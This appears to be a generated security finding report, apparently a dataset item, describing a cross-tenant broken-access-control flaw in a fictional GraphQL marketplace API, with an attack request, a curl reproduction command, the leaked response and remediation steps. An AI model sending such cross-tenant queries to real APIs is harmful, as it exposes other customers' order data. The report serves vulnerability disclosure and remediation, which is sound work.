# Security Analysis Report

**System:** ShopGrid Marketplace API — v3.9.5 (FINAL)
**Domain:** E-Commerce / Marketplace
**Example ID:** GQL-0253
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | BAC — Pattern 2.2 | Metadata/attribute side-channel exposes order details across tenant boundaries |

---

## Finding 1 — BAC: Metadata Side-Channel on Order Lookup

### Summary
The `getOrder` resolver returns metadata attributes (such as `tenantId`, `ownerId`, and `internalNotes`) alongside the requested resource. An attacker authenticated to `tenant-ff9a` can query order `O-2253` belonging to `tenant-ee32` and extract sensitive order metadata through these attribute fields, even without explicit intent to access the resource payload. The resolver lacks a tenant ownership guard, as documented in §4.0 RISK-GQL-253 and Pattern 2.2 (§5.0) of the provided context.txt.

### Evidence from HAR

**Request — Attack (§6.0)**
```
POST https://api.shopgrid-marketplace.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-ff9a
Content-Type: application/json

{"query": "query VulnerableOp { getOrder(id: \"O-2253\") { orderId tenantId ownerId data { sensitiveField internalNotes } } }"}
```
Note: `x-request-id: req-ff9aee32` is a server-assigned **response** header (§6.0 response.headers). It is not part of the attack request.

**Response — Victim Order Metadata Returned**
```json
{
  "data": {
    "getOrder": {
      "tenantId": "tenant-ee32",
      "ownerId": "other-user-ff9aee32",
      "data": {
        "sensitiveField": "CONFIDENTIAL-ff9aee32",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Evidence Map

| Artifact Location | Key Detail |
|---|---|
| §2.0 Architecture | Redis cache keyed by `orderId` only — no user/tenant dimension |
| §3.0 Schema | `getOrder(id: ID!)` — returns `tenantId`, `ownerId`, `internalNotes` without access control |
| §4.0 RISK-GQL-253 | Resolver fetches by `orderId` only; no tenancy check |
| §5.0 Pattern 2.2 | Metadata/attribute side-channel confirmed |
| HAR request | Attacker `tenant-ff9a` queries `O-2253` owned by `tenant-ee32` |
| HAR response | `CONFIDENTIAL-ff9aee32`, `tenantId`, `ownerId`, and `internalNotes` from victim tenant returned |

---

## Steps to Reproduce

```bash
# Step 1 — Authenticate as attacker (tenant-ff9a)
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"

# Step 2 — Query victim order O-2253, request metadata fields
# x-request-id is server-assigned and appears in the response only; not sent in the request
curl -s -X POST https://api.shopgrid-marketplace.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-tenant-id: tenant-ff9a" \
  -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { getOrder(id: \"O-2253\") { orderId tenantId ownerId data { sensitiveField internalNotes } } }"}'

# Expected (vulnerable): Returns CONFIDENTIAL-ff9aee32, tenantId, ownerId, internalNotes from tenant-ee32
# Expected (secure): Returns authorization error — "Not authorized to access order O-2253"
```

---

## Remediation

1. **Resolver ownership check:** In `getOrder`, after fetching by `orderId`, assert `record.tenantId === $jwt.tenantId`; return 403 if mismatch.
2. **Metadata field filtering:** Remove `tenantId` and `ownerId` from the API response schema — these are internal fields that should never be surfaced to callers.
3. **Field-level access control:** `internalNotes` must require an explicit privileged scope (e.g., `role:admin` or `scope:internal`) before being included in the response.
4. **Cache keying:** Include `tenantId` in the Redis cache key: `order:{tenantId}:{orderId}`.
5. **Schema tightening:** Use a public-facing `OrderPublic` type that omits internal metadata fields, returning only fields explicitly approved for caller consumption.
